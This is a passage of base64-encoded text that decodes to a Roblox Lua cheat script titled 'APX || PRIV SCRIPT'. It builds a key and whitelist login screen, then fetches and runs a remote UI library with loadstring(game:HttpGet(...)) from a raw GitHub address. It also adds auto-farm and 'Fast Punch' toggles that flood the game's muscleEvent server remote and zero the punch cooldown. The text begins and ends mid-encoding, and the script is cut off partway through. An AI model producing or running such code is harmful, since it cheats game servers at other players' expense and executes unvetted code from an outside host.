HcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgd2FpdCgwLjA1KQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGtleUJveCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCmtleUJveC5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMzApCmtleUJveC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNDUsIDApCmtleUJveC5QbGFjZWhvbGRlclRleHQgPSAiRW50ZXIga2V5Li4uIgprZXlCb3guVGV4dCA9ICIiCmtleUJveC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0MCkKa2V5Qm94LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQprZXlCb3guRm9udCA9IEVudW0uRm9udC5Hb3RoYW0Ka2V5Qm94LlRleHRTaXplID0gMTIKa2V5Qm94LlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCBVSUNvcm5lcjIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKVUlDb3JuZXIyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDUpClVJQ29ybmVyMi5QYXJlbnQgPSBrZXlCb3gKCmxvY2FsIHN1Ym1pdEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCnN1Ym1pdEJ0bi5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMzApCnN1Ym1pdEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNjUsIDApCnN1Ym1pdEJ0bi5UZXh0ID0gIlZFUklGWSBLRVkiCnN1Ym1pdEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpCnN1Ym1pdEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKc3VibWl0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZApzdWJtaXRCdG4uVGV4dFNpemUgPSAxMgpzdWJtaXRCdG4uUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIFVJQ29ybmVyMyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpVSUNvcm5lcjMuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikKVUlDb3JuZXIzLlBhcmVudCA9IHN1Ym1pdEJ0bgoKbG9jYWwgc3RhdHVzID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQpzdGF0dXMuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQpzdGF0dXMuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjg1LCAwKQpzdGF0dXMuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKc3RhdHVzLlRleHQgPSAiIgpzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCnN0YXR1cy5Gb250ID0gRW51bS5Gb250LkdvdGhhbQpzdGF0dXMuVGV4dFNpemUgPSAxMApzdGF0dXMuUGFyZW50ID0ga2V5RnJhbWUKCi0tIExvYWRpbmcgQmFyIEVsZW1lbnRzIChpbml0aWFsbHkgaGlkZGVuKQpsb2NhbCBsb2FkaW5nQmFyQmFja2dyb3VuZCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpsb2FkaW5nQmFyQmFja2dyb3VuZC5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApIC0tIFN0YXJ0IGFzIHRpbnkgYm94CmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCkgLS0gQ2VudGVyIHBvc2l0aW9uCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDQ1KQpsb2FkaW5nQmFyQmFja2dyb3VuZC5WaXNpYmxlID0gZmFsc2UKbG9hZGluZ0JhckJhY2tncm91bmQuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIGxvYWRpbmdCYXJVSUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpsb2FkaW5nQmFyVUlDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCmxvYWRpbmdCYXJVSUNvcm5lci5QYXJlbnQgPSBsb2FkaW5nQmFyQmFja2dyb3VuZAoKbG9jYWwgbG9hZGluZ0JhciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpsb2FkaW5nQmFyLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMSwgMCkKbG9hZGluZ0Jhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQpsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDIwMCwgMjU1KQpsb2FkaW5nQmFyLlBhcmVudCA9IGxvYWRpbmdCYXJCYWNrZ3JvdW5kCgpsb2NhbCBsb2FkaW5nQmFyQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmxvYWRpbmdCYXJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCmxvYWRpbmdCYXJDb3JuZXIuUGFyZW50ID0gbG9hZGluZ0JhcgoKbG9jYWwgbG9hZGluZ1RleHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCmxvYWRpbmdUZXh0LlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAxNSkKbG9hZGluZ1RleHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjcsIDApCmxvYWRpbmdUZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmxvYWRpbmdUZXh0LlRleHQgPSAiVmVyaWZ5aW5nIFBsYXllci4uLiIKbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyNTUpCmxvYWRpbmdUZXh0LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCmxvYWRpbmdUZXh0LlRleHRTaXplID0gMTEKbG9hZGluZ1RleHQuVmlzaWJsZSA9IGZhbHNlCmxvYWRpbmdUZXh0LlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCBwZXJjZW50YWdlVGV4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKcGVyY2VudGFnZVRleHQuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQpwZXJjZW50YWdlVGV4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNTUsIDApCnBlcmNlbnRhZ2VUZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnBlcmNlbnRhZ2VUZXh0LlRleHQgPSAiMCUiCnBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpwZXJjZW50YWdlVGV4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKcGVyY2VudGFnZVRleHQuVGV4dFNpemUgPSAxMgpwZXJjZW50YWdlVGV4dC5WaXNpYmxlID0gZmFsc2UKcGVyY2VudGFnZVRleHQuUGFyZW50ID0ga2V5RnJhbWUKCi0tIEhvdmVyIGVmZmVjdHMKc3VibWl0QnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC4yKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCl9KTpQbGF5KCkKZW5kKQoKc3VibWl0QnRuLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC4yKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjEsIDI0LCAyNCl9KTpQbGF5KCkKZW5kKQoKLS0gU2hha2UgZnVuY3Rpb24gZm9yIHdyb25nIGtleQpsb2NhbCBmdW5jdGlvbiBzaGFrZUZyYW1lKCkKICAgIGxvY2FsIG9yaWdpbmFsUG9zaXRpb24gPSBrZXlGcmFtZS5Qb3NpdGlvbgogICAgbG9jYWwgc2hha2VJbnRlbnNpdHkgPSA1CiAgICAKICAgIGZvciBpID0gMSwgNiBkbwogICAgICAgIGxvY2FsIG9mZnNldFggPSBtYXRoLnJhbmRvbSgtc2hha2VJbnRlbnNpdHksIHNoYWtlSW50ZW5zaXR5KQogICAgICAgIGxvY2FsIG9mZnNldFkgPSBtYXRoLnJhbmRvbSgtc2hha2VJbnRlbnNpdHksIHNoYWtlSW50ZW5zaXR5KQogICAgICAgIAogICAgICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgICAgICBrZXlGcmFtZSwgCiAgICAgICAgICAgIFR3ZWVuSW5mby5uZXcoMC4wNSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAgICAgIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xNjAgKyBvZmZzZXRYLCAwLjUsIC0xMDAgKyBvZmZzZXRZKX0KICAgICAgICApOlBsYXkoKQogICAgICAgIAogICAgICAgIHdhaXQoMC4wNSkKICAgIGVuZAogICAgCiAgICAtLSBSZXR1cm4gdG8gb3JpZ2luYWwgcG9zaXRpb24KICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgIGtleUZyYW1lLCAKICAgICAgICBUd2VlbkluZm8ubmV3KDAuMSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLAogICAgICAgIHtQb3NpdGlvbiA9IG9yaWdpbmFsUG9zaXRpb259CiAgICApOlBsYXkoKQplbmQKCi0tIFNVQ0NFU1M6IE1ha2UgYm9yZGVyIGdyZWVuIHRlbXBvcmFyaWx5CmxvY2FsIGZ1bmN0aW9uIGZsYXNoU3VjY2Vzc0JvcmRlcigpCiAgICBsb2NhbCBvcmlnaW5hbENvbG9ycyA9IHsKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDUxLCA1MSwgNTEpKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KSkKICAgIH0KICAgIAogICAgLS0gRmxhc2ggZ3JlZW4KICAgIGdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoNTAsIDIwMCwgNTApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApKQogICAgfSkKICAgIAogICAgd2FpdCgwLjgpCiAgICAKICAgIC0tIFJldHVybiB0byBvcmlnaW5hbCBjb2xvcnMKICAgIGdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcob3JpZ2luYWxDb2xvcnMpCmVuZAoKLS0gU2hyaW5rIGVsZW1lbnRzIGludG8gbG9hZGluZyBib3gKbG9jYWwgZnVuY3Rpb24gc2hyaW5rSW50b0xvYWRpbmdCb3goKQogICAgbG9jYWwgdHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQogICAgCiAgICAtLSBNYWtlIGxvYWRpbmcgYm94IHZpc2libGUgYnV0IHRpbnkKICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLlZpc2libGUgPSB0cnVlCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTUsIDApCiAgICAKICAgIC0tIEtleUJveCBzaHJpbmtzIHRvIGNlbnRlciBhbmQgZmFkZXMKICAgIGxvY2FsIGtleUJveFNocmluayA9IHR3ZWVuU2VydmljZTpDcmVhdGUoCiAgICAgICAga2V5Qm94LAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLkluKSwKICAgICAgICB7CiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCksCiAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCksCiAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxLAogICAgICAgICAgICBUZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgIH0KICAgICkKICAgIAogICAgLS0gU3VibWl0QnRuIHNocmlua3MgdG8gY2VudGVyIGFuZCBmYWRlcwogICAgbG9jYWwgc3VibWl0QnRuU2hyaW5rID0gdHdlZW5TZXJ2aWNlOkNyZWF0ZSgKICAgICAgICBzdWJtaXRCdG4sCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLAogICAgICAgIHsKICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKSwKICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjU1LCAwKSwKICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsCiAgICAgICAgICAgIFRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgfQogICAgKQogICAgCiAgICAtLSBQbGF5IHNocmluayBhbmltYXRpb25zCiAgICBrZXlCb3hTaHJpbms6UGxheSgpCiAgICBzdWJtaXRCdG5TaHJpbms6UGxheSgpCiAgICAKICAgIHdhaXQoMC42KQogICAgCiAgICAtLSBOb3cgZXhwYW5kIHRoZSBsb2FkaW5nIGJveCBpbnRvIGZ1bGwgbG9hZGluZyBiYXIKICAgIGxvY2FsIGV4cGFuZEJveCA9IHR3ZWVuU2VydmljZTpDcmVhdGUoCiAgICAgICAgbG9hZGluZ0JhckJhY2tncm91bmQsCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRWxhc3RpYywgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICB7CiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAyMCksCiAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC40NSwgMCkKICAgICAgICB9CiAgICApCiAgICAKICAgIGV4cGFuZEJveDpQbGF5KCkKICAgIAogICAgd2FpdCgwLjcpCmVuZAoKLS0gTG9hZGluZyBiYXIgYW5pbWF0aW9uCmxvY2FsIGZ1bmN0aW9uIGFuaW1hdGVMb2FkaW5nQmFyKCkKICAgIGxvYWRpbmdUZXh0LlZpc2libGUgPSB0cnVlCiAgICBwZXJjZW50YWdlVGV4dC5WaXNpYmxlID0gdHJ1ZQogICAgCiAgICAtLSBGYWRlIGluIHRleHQgZWxlbWVudHMKICAgIGxvYWRpbmdUZXh0LlRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICBwZXJjZW50YWdlVGV4dC5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZSgKICAgICAgICBsb2FkaW5nVGV4dCwKICAgICAgICBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLAogICAgICAgIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0KICAgICk6UGxheSgpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgIHBlcmNlbnRhZ2VUZXh0LAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAge1RleHRUcmFuc3BhcmVuY3kgPSAwfQogICAgKTpQbGF5KCkKICAgIAogICAgd2FpdCgwLjUpCiAgICAKICAgIC0tIFN0YXJ0IGxvYWRpbmcgcHJvZ3Jlc3MKICAgIGxvY2FsIHRvdGFsVGltZSA9IDIuNSAtLSAyLjUgc2Vjb25kcyB0b3RhbAogICAgbG9jYWwgc3RlcHMgPSAxMDAKICAgIGxvY2FsIHN0ZXBUaW1lID0gdG90YWxUaW1lIC8gc3RlcHMKICAgIAogICAgZm9yIGkgPSAwLCBzdGVwcyBkbwogICAgICAgIGxvY2FsIHByb2dyZXNzID0gaSAvIHN0ZXBzCiAgICAgICAgbG9hZGluZ0Jhci5TaXplID0gVURpbTIubmV3KHByb2dyZXNzLCAwLCAxLCAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHQgPSBtYXRoLmZsb29yKHByb2dyZXNzICogMTAwKSAuLiAiJSIKICAgICAgICAKICAgICAgICAtLSBDaGFuZ2UgY29sb3IgYmFzZWQgb24gcHJvZ3Jlc3MKICAgICAgICBpZiBwcm9ncmVzcyA8IDAuMzMgdGhlbgogICAgICAgICAgICBsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDgwLCA4MCkgLS0gUmVkCiAgICAgICAgZWxzZWlmIHByb2dyZXNzIDwgMC42NiB0aGVuCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTgwLCA2MCkgLS0gT3JhbmdlCiAgICAgICAgZWxzZQogICAgICAgICAgICBsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKSAtLSBHcmVlbgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHdhaXQoc3RlcFRpbWUpCiAgICBlbmQKZW5kCgotLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkCmxvY2FsIGZ1bmN0aW9uIGlzVXNlcldoaXRlbGlzdGVkKCkKICAgIGxvY2FsIHBsYXllck5hbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZTpsb3dlcigpCiAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbwogICAgICAgIGlmIHBsYXllck5hbWUgPT0gd2hpdGVsaXN0ZWROYW1lOmxvd2VyKCkgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gZmFsc2UKZW5kCgotLSBCdXR0b24gY2xpY2sgZnVuY3Rpb24KbG9jYWwgZnVuY3Rpb24gdmVyaWZ5S2V5KCkKICAgIGxvY2FsIGVudGVyZWRLZXkgPSBrZXlCb3guVGV4dDpnc3ViKCIlcysiLCAiIik6dXBwZXIoKQogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkKICAgIGxvY2FsIGtleVZhbGlkID0gZmFsc2UKICAgIAogICAgLS0gQ2hlY2sgaWYga2V5IGlzIHZhbGlkCiAgICBmb3IgXywgdmFsaWRLZXkgaW4gcGFpcnModmFsaWRLZXlzKSBkbwogICAgICAgIGlmIGVudGVyZWRLZXkgPT0gdmFsaWRLZXkgdGhlbgogICAgICAgICAgICBrZXlWYWxpZCA9IHRydWUKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBpZiBpc1doaXRlbGlzdGVkIGFuZCBrZXlWYWxpZCB0aGVuCiAgICAgICAgLS0gV2hpdGVsaXN0ZWQgdXNlciB3aXRoIGNvcnJlY3Qga2V5IC0gU0hSSU5LIFRPIExPQURJTkcgQk9YCiAgICAgICAgZmxhc2hTdWNjZXNzQm9yZGVyKCkgLS0gR1JFRU4gQk9SREVSIEZMQVNICiAgICAgICAgc2hyaW5rSW50b0xvYWRpbmdCb3goKQogICAgICAgIAogICAgICAgIC0tIFN0YXJ0IGxvYWRpbmcgYW5pbWF0aW9uCiAgICAgICAgYW5pbWF0ZUxvYWRpbmdCYXIoKQogICAgICAgIAogICAgICAgIC0tIFdhaXQgZm9yIGxvYWRpbmcgdG8gY29tcGxldGUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICAKICAgICAgICAtLSBTaG93IGZpbmFsIHJlc3VsdAogICAgICAgIGxvYWRpbmdUZXh0LlRleHQgPSAi4pyFIFdoaXRlbGlzdGVkIC0gQWNjZXNzIEdyYW50ZWQhIgogICAgICAgIGxvYWRpbmdUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKQogICAgICAgIAogICAgICAgIHdhaXQoMS41KQogICAgICAgIGtleUd1aTpEZXN0cm95KCkKICAgICAgICAKLS0gTG9hZCBVSSBMaWJyYXJ5CmxvY2FsIExpYnJhcnkgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R5bGFubm42OS9TSEVTSExMTExMTEwxMjNQUk9URUNURUQvcmVmcy9oZWFkcy9tYWluL0xpYnJhcnkubHVhIikpKCkKCi0tIENyZWF0ZSBNYWluIFdpbmRvdwpsb2NhbCBXaW5kb3cgPSBMaWJyYXJ5OldpbmRvdyh7CiAgICBUaXRsZSA9ICJBUFggfHwgUFJJViBTQ1JJUFQg4oCUIEhlbGxvICIgLi4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkRpc3BsYXlOYW1lLAogICAgRGVzYyA9ICJCeSA6IER5bGFuIiwKICAgIEljb24gPSBob3VzZSwKICAgIFRoZW1lID0gIkRhcmsiLAogICAgQ29uZmlnID0gewogICAgICAgIEtleWJpbmQgPSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wsCiAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCA1MDAsIDAsIDQwMCkKICAgIH0sCiAgICBDbG9zZVVJQnV0dG9uID0gewogICAgICAgIEVuYWJsZWQgPSB0cnVlLAogICAgICAgIFRleHQgPSAiT3Blbi9DbG9zZSIKICAgIH0KfSkKCi0tIFNpZGViYXIgVmVydGljYWwgU2VwYXJhdG9yCmxvY2FsIFNpZGViYXJMaW5lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpClNpZGViYXJMaW5lLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMSwgMCkKU2lkZWJhckxpbmUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTQwLCAwLCAwKQpTaWRlYmFyTGluZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA2MCkKU2lkZWJhckxpbmUuQm9yZGVyU2l6ZVBpeGVsID0gMApTaWRlYmFyTGluZS5aSW5kZXggPSA1ClNpZGViYXJMaW5lLk5hbWUgPSAiU2lkZWJhckxpbmUiClNpZGViYXJMaW5lLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgclN0byA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKSAKbG9jYWwgc25hY2tzID0geyJUT1VHSCBCYXIiLCAiUHJvdGVpbiBTaGFrZSIsICJQcm90ZWluIEJhciIsICJVTFRSQSBTaGFrZSIsICJFbmVyZ3kgU2hha2UiLCAiRW5lcmd5IEJhciIsICJUcm9waWNhbCBTaGFrZSJ9CmxvY2FsIHByb3RlaW5FZ2dOYW1lID0gIlByb3RlaW4gRWdnIgpsb2NhbCBkZWxheVRpbWUgPSAyOSAqIDYwICsgMzAgLS0gMjkgbWludXRlcyAzMCBzZWNvbmRzCiAgICAgICAgCi0tIEZhcm0gT1AgVGFiCmxvY2FsIEF1dG9GYXJtID0gV2luZG93OlRhYih7VGl0bGUgPSAiRmFybSBPUCIsIEljb24gPSAiZHVtYmJlbGwifSkKCi0tIEZhcm0gVG9vbHMgU2VjdGlvbgpBdXRvRmFybTpTZWN0aW9uKHtUaXRsZSA9ICJGQVJNIFRPT0xTIn0pCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0b0Zhcm0gd2VpZ2h0cyIsCiAgICBEZXNjID0gIkVxdWlwIGFueSBmYXJtaW5nIHRvb2xzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHdoaWxlIHN0YXRlIGRvCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7WzFdID0gInJlcCJ9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKSAgCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6V2FpdCgpICAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRmFzdCBQdW5jaApsb2NhbCBmdW5jdGlvbiBhdXRvRmFzdFB1bmNoKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBfRy5mYXN0UHVuY2ggZG8KICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgcHVuY2ggPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgIGlmIHB1bmNoIGFuZCBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgcHVuY2guYXR0YWNrVGltZS5WYWx1ZSA9IDAKICAgICAgICBlbmQKCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICBlbmQKCiAgICBsb2NhbCBwdW5jaCA9IHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgIGlmIHB1bmNoIGFuZCBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMC4zNQogICAgZW5kCgogICAgaWYgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgcGxheWVyLkNoYXJhY3Rlci5QdW5jaC5QYXJlbnQgPSBwbGF5ZXIuQmFja3BhY2sKICAgIGVuZAplbmQKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJGYXN0IFB1bmNoIiwKICAgIERlc2MgPSAiUmFwaWQgcHVuY2ggYXV0b21hdGlvbiIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBm